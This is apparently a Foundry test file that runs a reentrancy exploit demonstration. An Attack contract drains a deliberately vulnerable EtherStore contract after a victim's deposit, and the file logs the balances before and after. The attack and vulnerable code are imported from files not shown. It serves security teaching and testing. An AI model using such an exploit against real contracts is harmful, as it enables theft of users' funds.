// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import {Test, console2} from "forge-std/Test.sol";
import {EtherStore} from "../src/ReentrancyAttack.sol";
import {Attack} from "../src/AttackContract.sol";

contract ContractisExploitable is Test {
    EtherStore public etherStore;
    Attack attacker;
    address ATTACKER = makeAddr("attacker");
    address VICTIM = makeAddr("victim");
    uint256 constant AMOUNT = 1 ether;

    function setUp() public {
        etherStore = new EtherStore();
        attacker = new Attack(address(etherStore));
        vm.deal(ATTACKER, 4 ether);
        vm.deal(VICTIM, 4 ether);
    }

    function test_attackScenerio() public {
        // GET INITIAL CONTRACT BALANCES
        console2.log("EtherScore Balance is:", address(etherStore).balance);
        console2.log("Attack Balance is:", address(attacker).balance);

        // VICTIM MAKES DEPOSIT
        vm.startPrank(VICTIM);
        etherStore.deposit{value: AMOUNT}();
        vm.stopPrank();

        //UPDATED ETHERSCORE BALANCE
        console2.log("EtherScore balance after deposit is:", address(etherStore).balance);

        // ATTACKER MAKES DEPOSIT AND WITHDRAW ALL BALANCE
        vm.startPrank(ATTACKER);
        attacker.attack{value: AMOUNT}();
        vm.stopPrank();

        // BALANCE OF THE CONTRACTS
        console2.log("EtherScore Balance after Exploit is:", address(etherStore).balance);
        console2.log("Attack Balance after Exploit is:", address(attacker).balance);
    }
}
